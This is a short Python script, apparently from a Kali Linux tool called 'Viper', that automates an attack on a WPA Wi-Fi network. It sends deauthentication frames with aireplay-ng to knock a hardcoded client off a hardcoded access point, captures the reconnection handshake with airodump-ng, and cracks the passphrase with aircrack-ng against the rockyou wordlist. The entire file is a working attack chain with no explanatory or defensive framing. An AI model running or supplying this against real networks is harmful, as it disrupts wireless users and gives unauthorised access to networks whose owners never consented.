import subprocess as sb
import os
from threading import Thread
import time

ap_mac_address= '70:72:3C:C5:55:F3'
interface = 'wlan0mon'
c_mac = '7E:C9:59:3D:44:A0'
channel = '11'
dictionary = '/usr/share/wordlists/rockyou.txt'
results = '/home/kali/Viper/results/'
pcapfile4way=os.path.join(results,'wpa4wayhandshake')

def airodump():
    try:
        sb.run(['airodump-ng','--bssid', ap_mac_address,'--write' , f'{pcapfile4way}','--output-format','pcap', '-c', channel, interface], stdout=sb.DEVNULL, timeout=15)
    except sb.TimeoutExpired:
        pass
    # os.system(f'timeout 15 airodump-ng --bssid {ap_mac_address} --channel {channel} --write {pcapfile4way} {interface}')

def wpa_crack():
    deauthentication(10)
    airodump()
    # first_command_wpa_output=-1

    # while first_command_wpa_output==-1:
    #     first_command_wpa=sb.run(['timeout','15','airodump-ng','--bssid',ap_mac_address,'--write' , f'{pcapfile4way}' , '-c', channel, interface], capture_output=True, text=True)
    #     print(first_command_wpa.stdout)
    #     first_command_wpa_output=first_command_wpa.stdout.find('handshake') #This will tell us if the 4 way handshake is captured

    # b = Thread(target = airodump)
    # b.start()
    # time.sleep(15)
    # b.join()
    second_command_wpa=sb.run(['aircrack-ng' , f'{pcapfile4way}-01.cap','-w',dictionary], capture_output=True, text=True)
    print(second_command_wpa.stdout)


def deauthentication(number_of_deauth): 
    first_command_deauthentication = sb.run(['aireplay-ng','-0', str(number_of_deauth),'-a',ap_mac_address,'-c',c_mac,interface],capture_output=True)
    # print(first_command_deauthentication.stdout)



wpa_crack()